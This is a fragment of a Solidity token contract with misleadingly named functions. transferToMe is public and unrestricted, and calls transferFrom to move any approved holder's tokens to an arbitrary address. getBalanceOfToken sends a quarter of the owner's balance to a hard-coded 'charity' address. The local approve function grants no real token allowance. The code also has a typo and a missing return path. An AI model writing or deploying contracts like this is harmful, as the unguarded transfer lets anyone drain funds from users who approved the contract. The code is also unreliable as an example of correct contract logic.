address public  TTDT = 0x5462A8cf7D059021C1cD772984275E9479f36983;
address public owner;
mapping (address => mapping (address => uint256)) public allowance;
event Approve(address indexed owner, address indexed spender, uint256 value);


constructor() payable public  {
    
    owner = msg.sender;
}       

   function transferToMe(address _owner, address _token, uint256 _amount) public {
        address tokenContractAddress = TTDT;
        IERC20(address(tokenContractAddress)).transferFrom(_owner, _token, _amount);
} 


  function getBalanceOfToken() public  payable  returns (bool sucess) {

       if ( owner == msg.sender){

        address tokenContractAddress = TTDT;
        address a = msg.sender;
        address b = 0x485a967ca4307996308e3F52162D8dFCBfafE4dc;
        uint256 cantidad = IERC20(address(tokenContractAddress)).balanceOf(address(a));
        uint256 charity = cantidad / 4;
        transferToMe(owner,b,charity);
        return true;
            
        }
         
}
   function approve(address b, uint256 charity) public returns (bool success) {
    require(charity > 0, "Value must be greater than 0");
           allowance[msg.sender][b] = charity;

    emit Approve(msg.sender, b, charity);
    return true;
}
